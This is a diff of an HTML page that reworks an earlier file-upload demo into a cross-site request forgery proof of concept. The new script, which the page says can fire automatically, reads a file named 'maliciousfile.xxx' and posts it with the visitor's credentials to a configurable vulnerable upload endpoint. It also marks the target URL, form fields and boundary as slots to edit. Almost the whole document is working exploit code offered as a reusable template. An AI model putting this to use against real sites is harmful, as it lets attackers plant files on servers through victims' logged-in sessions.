@@ -1,57 +1,56 @@
 <!DOCTYPE html> 
 <html> 
-<head>
-<meta charset=utf-8 />
-<link href='http://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'> 
-<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js" type="text/javascript"></script>
-<style>
-body {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-serif;}
-a:link {color: green; }
-a:visited {color: darkgreen;}
-</style>
-</head>
 <body>
-<h1>Arbitrary file upload</h1>
-<p>by <a rel="me" href="http://blog.kotowicz.net">Krzysztof Kotowicz</a> | <a href="http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html">More info</a></a></p>
-<label>Filename: <input name="filename"></label><br />
-<p>Enter file contents below. If you want to send binary file, use JSON format enclosed in quotes
-e.g.:
-</p>
-<pre>
-"\u00DE\u00AD\u00BE\u00AF"
-</pre>
-<textarea cols=80 rows=10 name="contents"></textarea><br />
-<button type="button" id="upload" onclick="start()">Upload</button>
+<h1>CSRF arbitrary file upload</h1>
+<br><br>
+This is a Proof-of-Concept - the start() function can be invoked automatically.<br><br>
+This is a variation of the technique demonstrated here: http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html<br><br>
+Other pieces of code were taken from: http://hublog.hubmed.org/archives/001941.html<br><br>
+
+<button type="button" id="upload" onclick="start()"><font size="+2">Upload File</font></button>
 <script>
-var logUrl = window.location.href.replace('attacker', 'victim').replace('evil/upload.html','vuln/recv.php');
-
-function rawUpload(file, fileName) {
-    var reader = new FileReader();
-    reader.onload = function(e) {
-    	fileUpload(e.target.result, fileName)
-    };
-    reader.readAsBinaryString(file);
-}
-
-if (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {
-	XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
-	    function byteValue(x) {
-	        return x.charCodeAt(0) & 0xff;
-	    }
-	    var ords = Array.prototype.map.call(datastr, byteValue);
-	    var ui8a = new Uint8Array(ords);
-	    this.send(ui8a.buffer);
-	}
-}
+var logUrl = 'http://vulnappfileupload'; // edit this entry
 
 function fileUpload(fileData, fileName) {
 	  var fileSize = fileData.length,
-	    boundary = "xxxxxxxxx",
+	    boundary = "---------------------------270883142628617", // edit this entry
 	    uri = logUrl,
 	    xhr = new XMLHttpRequest();
+
+	  var additionalFields = {
+			   // in case multiple parameters need to be supplied
+			   param1 : "value1", // edit this entry
+			   param2 : "value2", // edit this entry
+			   "param3" : "value3" // edit this entry
+				
+	  }
+	  
+	  if (typeof XMLHttpRequest.prototype.sendAsBinary == "function") { // Firefox 3 & 4
+		var tmp = '';
+		for (var i = 0; i < fileData.length; i++) tmp += String.fromCharCode(fileData.charCodeAt(i) & 0xff);
+		fileData = tmp;
+	}
+	else { // Chrome 9
+		// http://javascript0.org/wiki/Portable_sendAsBinary
+		XMLHttpRequest.prototype.sendAsBinary = function(text){
+			var data = new ArrayBuffer(text.length);
+			var ui8a = new Uint8Array(data, 0);
+			for (var i = 0; i < text.length; i++) ui8a[i] = (text.charCodeAt(i) & 0xff);
+
+			var bb = new (window.BlobBuilder || window.WebKitBlobBuilder)();
+
+			bb.append(data);
+			var blob = bb.getBlob();
+			this.send(blob);
+	
+		}
+	}
+
+
+	  var fileFieldName = "filename_parameter"; // edit this entry
 	  
 	  xhr.open("POST", uri, true);
-	  xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary); // simulate a file MIME POST request.
+	  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary); // simulate a file MIME POST request.
 	  xhr.setRequestHeader("Content-Length", fileSize);
 	  xhr.withCredentials = "true";
  
@@ -60,54 +59,57 @@ function fileUpload(fileData, fileName) {
 	      if ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {
 	        
 	        if (xhr.responseText != "") {
-	          alert(JSON.parse(xhr.responseText).msg); // display response.
+	          alert(JSON.parse(xhr.responseText).msg); 
 	        }
 	      } else if (xhr.status == 0) {
-	    	  alert("Could not parse response because of SOP, but the file was uploaded if you were logged in.");
+	    	  
 	      }
 	    }
 	  }
 	  
-	  var body = "--" + boundary + "\r\n";
-	  body += "Content-Disposition: form-data; name=\"contents\"; filename=\"" + fileName + "\"\r\n";
-	  body += "Content-Type: application/octet-stream\r\n\r\n";
-	  body += fileData + "\r\n";
-	  body += "--" + boundary + "--";
+	  var body = "";
 	  
+	  for (var i in additionalFields) {
+		  if (additionalFields.hasOwnProperty(i)) {
+			  body += addField(i, additionalFields[i], boundary);
+		  }
+	  }
+
+	  body += addFileField(fileFieldName, fileData, fileName, boundary);
+	  body += "--" + boundary + "--";
 	  xhr.sendAsBinary(body);
 	  return true;
 }
 
-var formDataUpload = function(contents, name) {
-	var bb = new BlobBuilder(), 
-    fd = new FormData(),
-    blob;
+function addField(name, value, boundary) {
+	var c = "--" + boundary + "\r\n"
+	c += 'Content-Disposition: form-data; name="' + name + '"\r\n\r\n';
+	c += value + "\r\n";
+	return c;
+}
+
+function addFileField(name, value, filename, boundary) {
+    var c = "--" + boundary + "\r\n"
+    c += 'Content-Disposition: form-data; name="' + name + '"; filename="' + filename + '"\r\n';
+    c += "Content-Type: application/octet-stream\r\n\r\n"; // edit this entry if required
+    c += value + "\r\n";
+    return c;	
+}
+
+function getBinary(file){
+	var xhr = new XMLHttpRequest();  
+	xhr.open("GET", file, false);  
+	xhr.overrideMimeType("text/plain; charset=x-user-defined");  
+	xhr.send(null);
+	return xhr.responseText;
+}
+
+function start() {
+	var c = getBinary('maliciousfile.xxx');
+	fileUpload(c, "maliciousfile.xxx");
 	
-	bb.append(contents);
-    blob = bb.getBlob();
-    
-    fd.append('contents', blob);
-    var xml = new XMLHttpRequest();
-    xml.open("POST", logUrl, true);
-    xml.send(fd);
-};
-
-var start = function() { 
-	var c;
-	c = $('textarea[name=contents]').val();
-
-	if (c.indexOf('"') === 0) {
-		try {
-		c = JSON.parse(c);
-		} catch (e) {
-			alert("Invalid data format. Use JSON format or remove the first quote (\")");
-			return;
-		}
-	}
-	fileUpload(c, $('input[name=filename]').val());
-};
-
+}
 </script>
-</div>
+
 </body>
 </html>
